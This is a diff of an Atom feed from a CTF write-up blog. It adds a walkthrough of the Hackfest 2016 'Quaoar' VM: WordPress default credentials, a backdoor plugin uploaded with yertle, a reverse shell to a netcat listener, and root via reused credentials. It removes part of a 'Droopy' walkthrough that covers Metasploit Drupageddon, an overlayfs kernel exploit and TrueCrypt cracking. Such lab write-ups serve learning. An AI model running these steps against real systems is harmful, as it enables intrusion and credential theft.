@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeups | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2018-08-26T12:37:36-04:00</updated>
+  <updated>2018-09-21T13:22:02-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,199 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Hackfest 2016: Quaoar]]></title>
+    <link href="http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar/"/>
+    <updated>2018-09-21T10:37:53-04:00</updated>
+    <id>http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s target was created for the Hackfest 2016 CTF. The goal is to become root and get a flag on the machine.</p>
+
+<!-- more -->
+
+
+<p>Nmap shows SSH, Samba, a web server and mail services running on the target:</p>
+
+<p><code>
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
+|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
+|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
+53/tcp  open  domain      ISC BIND 9.8.1-P1
+| dns-nsid:
+|_  bind.version: 9.8.1-P1
+80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_Hackers
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: RESP-CODES SASL STLS CAPA UIDL PIPELINING TOP
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: post-login have more capabilities Pre-login LOGINDISABLEDA0001 LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID STARTTLS IMAP4rev1 IDLE SASL-IR
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
+445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
+993/tcp open  ssl/imap    Dovecot imapd
+|_imap-capabilities: post-login more capabilities Pre-login have LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID AUTH=PLAINA0001 IMAP4rev1 IDLE SASL-IR
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2018-09-21T14:42:41+00:00; +1s from scanner time.
+995/tcp open  ssl/pop3    Dovecot pop3d
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2018-09-21T14:42:40+00:00; +1s from scanner time.
+</code></p>
+
+<p>On the web server there are some pictures with planets and the message &ldquo;Hack The Planet&rdquo;. But there are entries in robots.txt:</p>
+
+<p>```
+Disallow: Hackers
+Allow: /wordpress/</p>
+
+<hr />
+
+<h1>/<em><strong> _   _  </strong> _  </em><strong>   </strong> _ _ __</h1>
+
+<h1>//  / / | | |/ _<code>|/ _ \ / _</code> | &lsquo;__|</h1>
+
+<h1>/ _/ /| |<em>| | (</em>| | (<em>) | (</em>| | |</h1>
+
+<h1>_<strong>,<em>\ _</em>,<em>|_</em>,_|_</strong>/ _<em>,</em>|_|</h1>
+
+<p>```</p>
+
+<p>No directory called hackers but there is a Wordpress blog :p</p>
+
+<p><img class="center" src="/images/pentest/quaoar/quaoar_blog.png" title="&lsquo;wordpress&rsquo; &lsquo;wordpress blog&rsquo;" ></p>
+
+<p>Naturally, I ran Wpscan, and it found 2 usernames:</p>
+
+<p>```
+[+] Enumerating usernames &hellip;
+[+] We identified the following 2 users:</p>
+
+<pre><code>+----+--------+--------+
+| ID | Login  | Name   |
++----+--------+--------+
+| 1  | admin  | admin  |
+| 2  | wpuser | wpuser |
++----+--------+--------+
+</code></pre>
+
+<p>```</p>
+
+<p>A prelimiary check for default credentials actually revealed the password for the admin user is..you will never guess it..admin! For receiving a shell, I wanted to try a new tool: <a href="https://github.com/n00py/WPForce">WPForce</a>!</p>
+
+<blockquote><p>WPForce is a suite of Wordpress Attack tools. Currently this contains 2 scripts &ndash; WPForce, which
+brute forces logins via the API, and Yertle, which uploads shells once admin credentials have been
+found. Yertle also contains a number of post exploitation modules.</p></blockquote>
+
+<p>I used the <code>yertle.py</code> script to upload a backdoor:</p>
+
+<p>```
+python yertle.py -u &ldquo;admin&rdquo; -p &ldquo;admin&rdquo; -t &ldquo;<a href="http://192.168.217.145/wordpress">http://192.168.217.145/wordpress</a>&rdquo; -i</p>
+
+<pre><code> _..---.--.    __   __        _   _
+</code></pre>
+
+<p>   .&lsquo;\ <strong>|/O.</strong>)   \ \ / /<strong> _ </strong>| |<em>| | </em><strong>
+  /</strong>.&rsquo; <em>/ .&ndash;&lsquo;</em>\    \ V / _ \ &rsquo;<strong>| </strong>| |/ _ .
+ (<strong><em><em>.&lsquo;.&ndash;</em>_</em></strong>)    | |  <strong>/ |  | |_| |  </strong>/
+  (<em>/ </em>)<strong>(<em> _)_   |</em>|_</strong>|<em>|   _</em>|<em>|___|
+   (</em>..)&mdash;(.._)&rsquo;&mdash;&lsquo;         ~n00py~</p>
+
+<pre><code>  Post-exploitation Module for Wordpress
+                 v.1.1.0
+</code></pre>
+
+<p>Backdoor uploaded!
+Upload Directory: cpucqjc
+os-shell> whoami
+Sent command: whoami
+www-data
+os-shell> pwd
+Sent command: pwd
+/var/www/wordpress/wp-content/plugins/cpucqjc
+```</p>
+
+<p>Time to snoop around! I was able to read <code>/var/www/wordpress/wp-config.php</code> and inside found credentials for the SQL database:</p>
+
+<p>```
+/<em>* MySQL database username </em>/
+define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);</p>
+
+<p>/<em>* MySQL database password </em>/
+define(&lsquo;DB_PASSWORD&rsquo;, &lsquo;rootpassword!&rsquo;);
+```</p>
+
+<p>I also found a flag inside <em>wpadmin</em>&rsquo;s home directory:</p>
+
+<p><code>
+os-shell&gt; cat /home/wpadmin/flag.txt
+Sent command: cat /home/wpadmin/flag.txt
+2bafe61f03117ac66a73c3c514de796e
+</code></p>
+
+<p>I found the shell I had pretty restrictive so I used Yertle to get a reverse shell that I could upgrade:</p>
+
+<p><code>
+os-shell&gt; shell
+IP Address: 192.168.217.132
+Port: 8888
+Sending reverse shell to 192.168.217.132 port 8888
+</code></p>
+
+<p>And on my listener side:</p>
+
+<p><code>
+nc -lnvp 8888
+listening on [any] 8888 ...
+connect to [192.168.217.132] from (UNKNOWN) [192.168.217.145] 50713
+bash: no job control in this shell
+www-data@Quaoar:/var/www/wordpress/wp-content/plugins/cpucqjc$
+</code></p>
+
+<p>I used Python to spawn a TTY and then I tried the root credentials for a pleasant surprise. They are the actual credentials of the root user!</p>
+
+<p><code>
+root@Quaoar:~# cat /root/flag.txt
+8e3f9ec016e3598c5eec11fd3d73f6fb
+</code></p>
+
+<p>And that was it for this challenge!</p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ Be cheerful while you are alive. \
+|                                  |
+\ &mdash; Phathotep, 24th Century B.C.  /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pwnlab: init]]></title>
@@ -454,7 +647,7 @@ hey</p>
 (</strong>  </em>) reading it                                                      (<strong>  _)
 (</strong>  <em>)                                                                 (__  </em>)
 (<strong>  _)                                             For sniferl4bs.com  (</strong>  <em>)
-( _ <strong>)                                <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#58;&#x63;&#108;&#x61;&#111;&#x72;&#64;&#80;&#119;&#110;&#x4c;&#97;&#x62;&#46;&#110;&#101;&#116;">&#x63;&#x6c;&#97;&#x6f;&#x72;&#x40;&#x50;&#x77;&#x6e;&#x4c;&#x61;&#x62;&#46;&#x6e;&#x65;&#116;</a> &ndash; @Chronicoder  ( _ </strong>)
+( _ <strong>)                                <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#99;&#x6c;&#97;&#x6f;&#x72;&#64;&#80;&#x77;&#x6e;&#x4c;&#x61;&#98;&#46;&#x6e;&#x65;&#116;">&#x63;&#x6c;&#97;&#x6f;&#x72;&#x40;&#x50;&#119;&#x6e;&#76;&#x61;&#x62;&#46;&#x6e;&#101;&#116;</a> &ndash; @Chronicoder  ( _ </strong>)
 (__  </em>)                                                                 (<strong>  <em>)
 (</em> </strong><em>)&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;(<em> </em><em>_)
 `&ndash;.</em>.&ndash;&lsquo;             <br/>
@@ -1773,11 +1966,11 @@ Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) 
 
 <p>```</p>
 
-<h2>ssh <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x53;&#x48;&#x61;&#121;&#x73;&#108;&#x65;&#116;&#x74;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#50;&#49;&#55;&#x2e;&#x31;&#52;&#49;">&#83;&#72;&#97;&#x79;&#x73;&#x6c;&#101;&#116;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#50;&#x31;&#x37;&#x2e;&#49;&#x34;&#x31;</a></h2>
+<h2>ssh <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#x53;&#x48;&#97;&#121;&#x73;&#x6c;&#x65;&#x74;&#116;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x32;&#x31;&#x37;&#46;&#x31;&#x34;&#x31;">&#x53;&#72;&#x61;&#x79;&#115;&#108;&#x65;&#x74;&#116;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#50;&#x31;&#x37;&#46;&#x31;&#52;&#49;</a></h2>
 
 <h2>~          Barry, don&rsquo;t forget to put a message here           ~</h2>
 
-<p><a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#83;&#x48;&#x61;&#x79;&#115;&#108;&#101;&#x74;&#x74;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#x32;&#x31;&#x37;&#x2e;&#49;&#x34;&#x31;">&#83;&#x48;&#x61;&#121;&#115;&#x6c;&#101;&#x74;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#50;&#49;&#55;&#46;&#49;&#52;&#x31;</a>&rsquo;s password:
+<p><a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#83;&#72;&#x61;&#121;&#115;&#108;&#x65;&#x74;&#x74;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x32;&#49;&#x37;&#46;&#x31;&#x34;&#49;">&#x53;&#x48;&#x61;&#121;&#x73;&#x6c;&#101;&#x74;&#x74;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#50;&#x31;&#55;&#x2e;&#x31;&#x34;&#49;</a>&rsquo;s password:
 Welcome back!</p>
 
 <p>SHayslett@red:~$
@@ -1996,9 +2189,9 @@ nikto -h 192.168.217.141:12380</p>
 <hr />
 
 <ul>
-<li>SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#112;&#x61;&#109;&#64;&#114;&#x65;&#x64;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;&#x68;&#x6f;&#x73;&#x74;">&#x70;&#x61;&#x6d;&#x40;&#x72;&#x65;&#100;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;&#104;&#x6f;&#x73;&#x74;</a>
+<li>SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#112;&#x61;&#109;&#x40;&#114;&#101;&#x64;&#x2e;&#x6c;&#x6f;&#x63;&#97;&#108;&#104;&#x6f;&#115;&#116;">&#x70;&#x61;&#x6d;&#64;&#114;&#101;&#x64;&#46;&#108;&#111;&#99;&#x61;&#x6c;&#104;&#x6f;&#115;&#116;</a>
                  Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
-                 Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=<a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#112;&#97;&#109;&#x40;&#x72;&#x65;&#x64;&#46;&#108;&#111;&#x63;&#97;&#108;&#x68;&#x6f;&#x73;&#x74;">&#x70;&#97;&#x6d;&#64;&#114;&#101;&#x64;&#x2e;&#108;&#x6f;&#99;&#x61;&#108;&#x68;&#111;&#115;&#x74;</a>
+                 Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=<a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x70;&#97;&#x6d;&#x40;&#x72;&#x65;&#100;&#46;&#108;&#x6f;&#x63;&#x61;&#x6c;&#104;&#x6f;&#x73;&#116;">&#x70;&#97;&#x6d;&#x40;&#x72;&#101;&#x64;&#46;&#x6c;&#111;&#99;&#x61;&#x6c;&#x68;&#x6f;&#x73;&#116;</a>
 
 <ul>
 <li>Start Time:         2018-06-01 06:46:45 (GMT-4)</li>
@@ -2499,7 +2692,7 @@ sec-9720.txt
 <h1>Back To The Future: Unix Wildcards Gone Wild</h1>
 
 <ul>
-<li>Leon Juranic <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#108;&#x65;&#x6f;&#x6e;&#x40;&#100;&#101;&#102;&#101;&#x6e;&#115;&#101;&#99;&#x6f;&#100;&#101;&#46;&#99;&#111;&#109;">&#x6c;&#101;&#111;&#110;&#x40;&#x64;&#x65;&#102;&#101;&#x6e;&#x73;&#101;&#99;&#111;&#100;&#x65;&#46;&#99;&#111;&#109;</a></li>
+<li>Leon Juranic <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#108;&#x65;&#111;&#110;&#64;&#x64;&#101;&#x66;&#x65;&#x6e;&#x73;&#x65;&#x63;&#111;&#x64;&#101;&#46;&#99;&#111;&#109;">&#x6c;&#x65;&#x6f;&#110;&#x40;&#100;&#x65;&#102;&#x65;&#x6e;&#x73;&#x65;&#99;&#111;&#x64;&#101;&#x2e;&#x63;&#111;&#x6d;</a></li>
 <li>Creation Date: 04/20/2013</li>
 <li>Release Date: 06/25/2014</li>
 </ul>
@@ -3157,471 +3350,6 @@ If you have not read it give it a try:
 
 <p>/ Increased knowledge will help you now. \
 \ Have mate&rsquo;s phone bugged.              /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Dropping Droopy]]></title>
-    <link href="http://chousensha.github.io/blog/2018/05/04/dropping-droopy/"/>
-    <updated>2018-05-04T13:05:08-04:00</updated>
-    <id>http://chousensha.github.io/blog/2018/05/04/dropping-droopy</id>
-    <content type="html"><![CDATA[<p>I&rsquo;m back in the game with preparing for OSCP, and resuming the VulnHub machines. Today&rsquo;s target is Droopy. The author left 2 hints for this challenge:</p>
-
-<p>1.) Grab a copy of the rockyou wordlist.</p>
-
-<p>2.) It&rsquo;s fun to read other people&rsquo;s email.</p>
-
-<!-- more -->
-
-
-<p><code>
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
-|_http-generator: Drupal 7 (http://drupal.org)
-| http-robots.txt: 36 disallowed entries (15 shown)
-| /includes/ /misc/ /modules/ /profiles/ /scripts/
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
-|_/LICENSE.txt /MAINTAINERS.txt
-|_http-server-header: Apache/2.4.7 (Ubuntu)
-|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...
-</code></p>
-
-<p>Looks like this will be a web-based challenge.</p>
-
-<p><img class="center" src="/images/pentest/droopy.png" title="&lsquo;droopy&rsquo; &lsquo;droopy&rsquo;" ></p>
-
-<p>There are quite a few entries inside robots.txt:</p>
-
-<p>```
-User-agent: *
-Crawl-delay: 10</p>
-
-<h1>Directories</h1>
-
-<p>Disallow: /includes/
-Disallow: /misc/
-Disallow: /modules/
-Disallow: /profiles/
-Disallow: /scripts/
-Disallow: /themes/</p>
-
-<h1>Files</h1>
-
-<p>Disallow: /CHANGELOG.txt
-Disallow: /cron.php
-Disallow: /INSTALL.mysql.txt
-Disallow: /INSTALL.pgsql.txt
-Disallow: /INSTALL.sqlite.txt
-Disallow: /install.php
-Disallow: /INSTALL.txt
-Disallow: /LICENSE.txt
-Disallow: /MAINTAINERS.txt
-Disallow: /update.php
-Disallow: /UPGRADE.txt
-Disallow: /xmlrpc.php</p>
-
-<h1>Paths (clean URLs)</h1>
-
-<p>Disallow: /admin/
-Disallow: /comment/reply/
-Disallow: /filter/tips/
-Disallow: /node/add/
-Disallow: /search/
-Disallow: /user/register/
-Disallow: /user/password/
-Disallow: /user/login/
-Disallow: /user/logout/</p>
-
-<h1>Paths (no clean URLs)</h1>
-
-<p>Disallow: /?q=admin/
-Disallow: /?q=comment/reply/
-Disallow: /?q=filter/tips/
-Disallow: /?q=node/add/
-Disallow: /?q=search/
-Disallow: /?q=user/password/
-Disallow: /?q=user/register/
-Disallow: /?q=user/login/
-Disallow: /?q=user/logout/
-```</p>
-
-<p>Sifting through the entries, I found the exact version on Drupal is 7.30, from the /CHANGELOG.txt file. Googling an exploit for this version led me to..<a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon">Drupageddon</a>!!  Or more official, CVE-2014-3704, which describes a SQL injection vulnerability in Drupal. I fired up Metasploit for the exploit:</p>
-
-<p>```
-msf > use exploit/multi/http/drupal_drupageddon
-msf exploit(drupal_drupageddon) > info</p>
-
-<pre><code>   Name: Drupal HTTP Parameter Key/Value SQL Injection
- Module: exploit/multi/http/drupal_drupageddon
-</code></pre>
-
-<p>   Platform: PHP</p>
-
-<pre><code>   Arch: php
-</code></pre>
-
-<p> Privileged: No</p>
-
-<pre><code>License: Metasploit Framework License (BSD)
-   Rank: Excellent
-</code></pre>
-
-<p>  Disclosed: 2014-10-15</p>
-
-<p>Provided by:
-  SektionEins
-  Christian Mehlmauer <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#70;&#x69;&#114;&#x65;&#70;&#97;&#x72;&#116;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#70;&#x69;&#x72;&#101;&#x46;&#x61;&#114;&#x74;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a>
-  Brandon Perry</p>
-
-<p>Available targets:
-  Id  Name</p>
-
-<hr />
-
-<p>  0   Drupal 7.0 &ndash; 7.31</p>
-
-<p>Basic options:
-  Name       Current Setting  Required  Description</p>
-
-<hr />
-
-<p>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
-  RHOST      192.168.217.139  yes       The target address
-  RPORT      80               yes       The target port (TCP)
-  SSL        false            no        Negotiate SSL/TLS for outgoing connections
-  TARGETURI  /                yes       The target URI of the Drupal installation
-  VHOST                       no        HTTP server virtual host</p>
-
-<p>Payload information:</p>
-
-<p>Description:
-  This module exploits the Drupal HTTP Parameter Key/Value SQL
-  Injection (aka Drupageddon) in order to achieve a remote shell on
-  the vulnerable instance. This module was tested against Drupal 7.0
-  and 7.31 (was fixed in 7.32).</p>
-
-<p>References:
-  <a href="https://cvedetails.com/cve/CVE-2014-3704/">https://cvedetails.com/cve/CVE-2014-3704/</a>
-  <a href="https://www.drupal.org/SA-CORE-2014-005">https://www.drupal.org/SA-CORE-2014-005</a>
-  <a href="http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html">http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html</a>
-msf exploit(drupal_drupageddon) > exploit</p>
-
-<p>[<em>] Started reverse TCP handler on 192.168.217.132:4444
-[</em>] Testing page
-[<em>] Creating new user yCTZcwgtLV:WLhkIYdDtB
-[</em>] Logging in as yCTZcwgtLV:WLhkIYdDtB
-[<em>] Trying to parse enabled modules
-[</em>] Enabling the PHP filter module
-[<em>] Setting permissions for PHP filter module
-[</em>] Getting tokens from create new article page
-[<em>] Calling preview page. Exploit should trigger&hellip;
-[</em>] Sending stage (37543 bytes) to 192.168.217.139
-[*] Meterpreter session 1 opened (192.168.217.132:4444 &ndash;> 192.168.217.139:51854) at 2018-05-04 13:48:44 -0400
-```</p>
-
-<p>I dropped into a shell and checked the kernel version:</p>
-
-<p><code>
-meterpreter &gt; shell
-Process 1385 created.
-Channel 0 created.
-uname -a
-Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
-</code></p>
-
-<p>I ran the 3.13 version through the exploit check part of my <a href="https://github.com/chousensha/linux_privcheck">privcheck</a> script:</p>
-
-<p>```
-python linux_privcheck.py
-Kernel version is 3.13</p>
-
-<h6>#</h6>
-
-<p>POTENTIALLY VULNERABLE TO
-Name: Double-free usb-midi SMEP Local Privilege Escalation
-CVE: CVE-2016-2384
-Source code: <a href="https://www.exploit-db.com/exploits/41999/">https://www.exploit-db.com/exploits/41999/</a></p>
-
-<h6>#</h6>
-
-<h6>#</h6>
-
-<p>POTENTIALLY VULNERABLE TO
-Name: overlayfs Privilege Escalation
-CVE: CVE-2015-1328
-Source code: <a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p>
-
-<h6>#</h6>
-
-<h6>#</h6>
-
-<p>POTENTIALLY VULNERABLE TO
-Name: ptrace/sysret Privilege Escalation
-CVE: CVE-2014-4699
-Source code: <a href="https://www.exploit-db.com/exploits/34134/">https://www.exploit-db.com/exploits/34134/</a></p>
-
-<h6>#</h6>
-
-<h6>#</h6>
-
-<p>POTENTIALLY VULNERABLE TO
-Name: CLONE_NEWUSER|CLONE_FS Privilege Escalation
-CVE: N/A
-Source code: <a href="https://www.exploit-db.com/exploits/38390/">https://www.exploit-db.com/exploits/38390/</a></p>
-
-<h6>#</h6>
-
-<h6>#</h6>
-
-<p>POTENTIALLY VULNERABLE TO
-Name: b43 Wireless Driver Privilege Escalation
-CVE: CVE-2013-2852
-Source code: <a href="https://www.exploit-db.com/exploits/38559/">https://www.exploit-db.com/exploits/38559/</a></p>
-
-<h6>#</h6>
-
-<h6>#</h6>
-
-<p>POTENTIALLY VULNERABLE TO
-Name: open-time Capability file_ns_capable() Privilege Escalation
-CVE: CVE-2013-1959
-Source code: <a href="https://www.exploit-db.com/exploits/25450/">https://www.exploit-db.com/exploits/25450/</a></p>
-
-<h6>#</h6>
-
-<p>```</p>
-
-<p>Ubuntu and overlayfs exploit = PWN! I uploaded the exploit source code to the target via Meterpreter:</p>
-
-<p><code>
-meterpreter &gt; upload /root/37292.c /tmp/
-[*] uploading  : /root/37292.c -&gt; /tmp/
-[*] uploaded   : /root/37292.c -&gt; /tmp//37292.c
-</code></p>
-
-<p>I went back to the shell, and compiled the exploit and made it executable. Droopy is rooted!</p>
-
-<p>```
-gcc 37292.c -o overlayfs
-chmod +x overlayfs
-./overlayfs
-spawning threads
-mount #1
-mount #2
-child threads done
-/etc/ld.so.preload created
-creating shared library
-sh: 0: can&rsquo;t access tty; job control turned off</p>
-
-<h1>whoami</h1>
-
-<p>root
-```</p>
-
-<p>But the challenge is not over here. We are root, but remember the hints! We didn&rsquo;t get to do anything with them. I went to the <code>/var/mail</code> directory and found the following message:</p>
-
-<p>```</p>
-
-<h1>cat www-data</h1>
-
-<p>From Dave <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x64;&#97;&#x76;&#x65;&#x40;&#100;&#x72;&#111;&#x6f;&#x70;&#x79;&#46;&#101;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#46;&#x63;&#x6f;&#x6d;">&#x64;&#x61;&#118;&#101;&#x40;&#x64;&#x72;&#x6f;&#111;&#x70;&#121;&#x2e;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#111;&#109;</a> Wed Thu 14 Apr 04:34:39 2016
-Date: 14 Apr 2016 04:34:39 +0100
-From: Dave <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#100;&#x61;&#118;&#101;&#64;&#x64;&#114;&#x6f;&#111;&#112;&#x79;&#46;&#101;&#120;&#97;&#109;&#x70;&#x6c;&#101;&#46;&#99;&#111;&#109;">&#x64;&#x61;&#x76;&#101;&#x40;&#100;&#114;&#111;&#111;&#x70;&#121;&#x2e;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x63;&#111;&#x6d;</a>
-Subject: rockyou with a nice hat!
-Message-ID: <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#55;&#x33;&#48;&#x32;&#x36;&#x32;&#x35;&#x36;&#x38;&#64;&#x65;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#x63;&#x6f;&#109;">&#x37;&#x33;&#x30;&#x32;&#x36;&#x32;&#x35;&#x36;&#x38;&#64;&#x65;&#x78;&#97;&#x6d;&#112;&#x6c;&#101;&#46;&#99;&#111;&#x6d;</a>
-X-IMAP: 0080081351 0000002016
-Status: NN</p>
-
-<p>George,</p>
-
-<p>   I&rsquo;ve updated the encrypted file&hellip; You didn&rsquo;t leave any
-hints for me. The password isn&rsquo;t longer than 11 characters
-and anyway, we know what academy we went to, don&rsquo;t you&hellip;?</p>
-
-<p>I&rsquo;m sure you&rsquo;ll figure it out it won&rsquo;t rockyou too much!</p>
-
-<p>If you are still struggling, remember that song by The Jam</p>
-
-<p>Later,
-Dave
-```</p>
-
-<p>Here it is, another reference to the rockyou list! I&rsquo;ve looked around and found the mentioned encrypted file at <code>/root/dave.tc</code>. The <em>tc</em> extension is for a Truecrypt virtual encrypted disk. So now we know what to crack, and roughly how to do it.</p>
-
-<p>The rockyou.txt file has over 14 million entries, so we&rsquo;re gonna need to make good use of the hints:</p>
-
-<p><code>
-wc -l /usr/share/wordlists/rockyou.txt
-14344392 /usr/share/wordlists/rockyou.txt
-</code></p>
-
-<p>I made a new file with only the entries that were 11 characters long:</p>
-
-<p><code>
-grep -E '^.{11}$' /usr/share/wordlists/rockyou.txt &gt; /root/rocked.txt
-wc -l rocked.txt
-865891 rocked.txt
-</code></p>
-
-<p>And then I created a final file with only the entries that had &ldquo;academy&rdquo; in them:</p>
-
-<p><code>
-grep academy rocked.txt &gt; rockademy.txt
-wc -l rockademy.txt
-16 rockademy.txt
-</code></p>
-
-<p>From over 14 million to 16 entries?! Sounds too good to be true! Let&rsquo;s put it to the test. First, I had to transfer the encrypted file to my machine. I copied <em>dave.tc</em> to /tmp and then downloaded it from there with meterpreter:</p>
-
-<p><code>
-meterpreter &gt; download /tmp/dave.tc
-[*] Downloading: /tmp/dave.tc -&gt; dave.tc
-[*] Downloaded 1.00 MiB of 5.00 MiB (20.0%): /tmp/dave.tc -&gt; dave.tc
-[*] Downloaded 2.00 MiB of 5.00 MiB (40.0%): /tmp/dave.tc -&gt; dave.tc
-[*] Downloaded 3.00 MiB of 5.00 MiB (60.0%): /tmp/dave.tc -&gt; dave.tc
-[*] Downloaded 4.00 MiB of 5.00 MiB (80.0%): /tmp/dave.tc -&gt; dave.tc
-[*] Downloaded 5.00 MiB of 5.00 MiB (100.0%): /tmp/dave.tc -&gt; dave.tc
-[*] download   : /tmp/dave.tc -&gt; dave.tc
-</code></p>
-
-<p>For cracking the file, Kali already comes with TrueCrack preinstalled:</p>
-
